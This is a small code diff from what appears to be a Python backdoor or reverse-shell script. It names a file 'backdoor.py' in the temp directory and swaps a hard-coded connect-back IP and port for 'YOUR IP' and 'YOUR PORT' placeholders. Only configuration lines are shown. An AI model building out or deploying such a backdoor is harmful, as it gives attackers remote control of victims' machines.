@@ -4,8 +4,8 @@ import subprocess
 import tempfile
 import os
 
-ip = (str('192.168.0.100'))
-port = (int('443'))
+ip = (str('YOUR IP'))
+port = (int('YOUR PORT'))
 filename = ('backdoor.py')
 tempdir = (tempfile.gettempdir())
 
